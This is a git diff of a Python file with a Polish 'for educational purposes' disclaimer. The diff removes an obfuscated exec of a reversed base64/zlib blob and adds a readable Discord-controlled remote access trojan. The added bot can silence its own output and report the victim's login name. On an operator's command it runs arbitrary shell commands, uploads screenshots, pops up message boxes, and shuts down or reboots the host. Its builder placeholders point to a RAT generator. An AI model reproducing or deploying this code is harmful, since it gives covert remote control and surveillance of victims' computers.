@@ -1,6 +1,192 @@
 # ⚠️ PROGRAM POWSTAŁ W CELACH EDUKACYJNYCH
 # NIE PONOSZĘ ODPOWIEDZIALNOŚCI ZA SZKODY
 # STWORZYŁ KOLOPA :D
-# source code: https://discord.gg/Mg7XTA3VMd
 
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import subprocess
+import sys
+import os
+
+def install_dependencies():
+    dependencies = {
+        "discord": "discord.py",
+        "pyautogui": "pyautogui",
+        "PIL": "pillow"
+    }
+    for module_name, pip_name in dependencies.items():
+        try:
+            __import__(module_name)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
+
+try:
+    install_dependencies()
+except Exception:
+    pass
+
+import discord
+import ctypes
+
+BOT_TOKEN = "{{BOT_TOKEN}}"
+PREFIX = "{{PREFIX}}"
+SILENT_MODE = "{{SILENT_MODE}}" 
+TARGET_CHANNEL_ID = "{{CHANNEL_ID}}"
+AUTHORIZED_USER_ID = "{{OWNER_ID}}"
+
+if SILENT_MODE == "True":
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.devnull, 'w')
+  
+intents = discord.Intents.default()
+intents.message_content = True
+client = discord.Client(intents=intents)
+
+@client.event
+async def on_ready():
+    if SILENT_MODE != "True":
+        print(f"[+] Agent zalogowany pomyślnie jako: {client.user}")
+        print(f"[*] Aktywny profil systemowy: {os.getlogin()}")
+    
+    if TARGET_CHANNEL_ID:
+        try:
+            channel = client.get_channel(int(TARGET_CHANNEL_ID))
+            if channel:
+                await channel.send(f"online na maszynie: `{os.getlogin()}`")
+        except Exception:
+            pass
+
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
+      
+    if TARGET_CHANNEL_ID and str(message.channel.id) != TARGET_CHANNEL_ID:
+        return
+
+    if AUTHORIZED_USER_ID and str(message.author.id) != AUTHORIZED_USER_ID:
+        return
+      
+    if message.content == f"{PREFIX}help":
+        embed = discord.Embed(
+            title="Dostępne Komendy",
+            description="Lista komend, które możesz uruchomić, aby zarządzać docelowym komputerem.",
+            color=discord.Color.purple()
+        )
+
+        embed.add_field(
+            name="Konfiguracja",
+            value=f"**Prefiks:** `{PREFIX}`\n"
+                  f"**Uprawniony użytkownik:** <@{AUTHORIZED_USER_ID if AUTHORIZED_USER_ID else 'Wszyscy'}>\n"
+                  f"**Kanał główny:** <#{TARGET_CHANNEL_ID if TARGET_CHANNEL_ID else 'Dowolny'}>",
+            inline=False
+        )
+
+        embed.add_field(
+            name="Informacje o systemie",
+            value=f"`{PREFIX}info` - Pobiera zaawansowane informacje o systemie",
+            inline=False
+        )
+
+        embed.add_field(
+            name="Komunikaty",
+            value=f"`{PREFIX}msgbox [tekst]` - Wyświetla wyskakujące okienko z wiadomością",
+            inline=False
+        )
+
+        embed.add_field(
+            name="Zarządzanie systemem",
+            value=f"`{PREFIX}screenshot` - Robi i wysyła zrzut ekranu\n"
+                  f"`{PREFIX}cmd [polecenie]` - Wykonuje standardową komendę CMD/Terminal",
+            inline=False
+        )
+
+        embed.add_field(
+            name="Zasilanie i BOT",
+            value=f"`{PREFIX}shutdown` - Wyłącza komputer stacyjny\n"
+                  f"`{PREFIX}restart` - Uruchamia ponownie system\n"
+                  f"`{PREFIX}exit` - Zamyka BOTA i kończy proces",
+            inline=False
+        )
+
+        await message.channel.send(embed=embed)
+      
+    elif message.content == f"{PREFIX}info":
+        try:
+            login = os.getlogin()
+            sys_name = os.name
+            info_text = (
+                f"Użytkownik: {login}\n"
+                f"Środowisko OS: {sys_name}\n"
+                f"Katalog roboczy: {os.getcwd()}"
+            )
+            await message.channel.send(f"```\n{info_text}\n```")
+        except Exception as e:
+            await message.channel.send(f"Błąd zbierania informacji: {e}")
+          
+    elif message.content.startswith(f"{PREFIX}msgbox "):
+        text_to_show = message.content[len(f"{PREFIX}msgbox "):]
+        await message.channel.send(f"Wyświetlam okienko z napisem: `{text_to_show}`")
+        
+        if os.name == "nt":
+            import threading
+            def show_box():
+                ctypes.windll.user32.MessageBoxW(0, text_to_show, "Powiadomienie Systemowe", 0)
+            threading.Thread(target=show_box).start()
+        else:
+            await message.channel.send("Funkcja okienek systemowych jest wspierana tylko na Windows.")
+
+    elif message.content == f"{PREFIX}screenshot":
+        import pyautogui
+        await message.channel.send("Generowanie zrzutu ekranu...")
+        try:
+            filename = "temp_ss.png"
+            screenshot = pyautogui.screenshot()
+            screenshot.save(filename)
+            
+            file = discord.File(filename, filename="screenshot.png")
+            await message.channel.send("Oto aktualny widok pulpitu:", file=file)
+
+            os.remove(filename)
+        except Exception as e:
+            await message.channel.send(f"Nie udało się przechwycić ekranu: {e}")
+
+    elif message.content.startswith(f"{PREFIX}cmd "):
+        command = message.content[len(f"{PREFIX}cmd "):]
+        
+        try:
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=12)
+            try:
+                decoded_output = output.decode("cp852")  
+            except UnicodeDecodeError:
+                decoded_output = output.decode("utf-8", errors="replace")
+        except subprocess.TimeoutExpired:
+            decoded_output = "Błąd: Przekroczono czas oczekiwania na odpowiedź konsoli (12s)."
+        except Exception as e:
+            decoded_output = f"Błąd przetwarzania komendy: {str(e)}"
+
+        if len(decoded_output) > 1900:
+            decoded_output = decoded_output[:1900] + "\n...[Wynik skrócony przez bufor bota]..."
+
+        await message.channel.send(f"```\n{decoded_output}\n```")
+
+    elif message.content == f"{PREFIX}shutdown":
+        await message.channel.send("wyłączanie systemu (za 1 sekundę)...")
+        if os.name == "nt":
+            os.system("shutdown /s /t 1")
+        else:
+            os.system("shutdown -h now")
+
+    elif message.content == f"{PREFIX}restart":
+        await message.channel.send("Restartowanie systemu (za 1 sekundę)...")
+        if os.name == "nt":
+            os.system("shutdown /r /t 1")
+        else:
+            os.system("reboot")
+          
+    elif message.content == f"{PREFIX}exit":
+        await message.channel.send("Proces bota został zdalnie przerwany.")
+        await client.close()
+        sys.exit()
+
+if __name__ == "__main__":
+    if BOT_TOKEN and not BOT_TOKEN.startswith("{{"):
+        client.run(BOT_TOKEN)
